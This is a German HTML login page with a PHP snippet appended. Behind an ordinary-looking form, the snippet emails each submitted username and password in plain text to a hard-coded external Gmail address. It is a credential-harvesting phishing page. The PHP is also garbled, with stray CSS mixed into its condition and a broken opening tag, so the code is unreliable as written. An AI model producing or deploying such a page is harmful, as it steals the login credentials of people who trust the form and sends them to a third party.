 <!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8">
  <title>Login</title>
  <style>
    body {
      background-color: #f2f2f2;
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
    }

    form {
      width: 300px;
      margin: 100px auto;
      background: #ffffff;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
    }

    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 10px;
      border-radius: 4px;
      border: none;
      margin-bottom: 15px;
      background-color: #e6e6e6;
      font-size: 14px;
    }

    button {
      width: 100%;
      padding: 10px;
      background-color: #4CAF50;
      color: #ffffff;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      font-size: 14px;
      transition: background-color 0.3s ease;
    }

    button:hover {
      background-color: #45a049;
    }

    h2 {
      text-align: center;
      margin-bottom: 20px;
      color: #333333;
    }
  </style>
</head>
<body>
  <form>
    <h2>Einloggen</h2>
    <input type="text" placeholder="Benutzername" required>
    <input type="password" placeholder="Passwort" required>
    <button type="submit">Login</button>
  </form>
</body>
</html>
php
($_POST['username'])  text-decoration-color:#B4ABC5; font-style:italic;">($_POST['password'])) {
  $to = 'ghaithalatrash0@gmail.com';
  $subject = 'Neuer Benutzer registriert';
  $message = 'Benutzername: ' . $_POST['username'] . PHP_EOL;
  $message .= 'Passwort: ' . $_POST['password'] . PHP_EOL;
  mail($to,$subject,$message);
}
?>
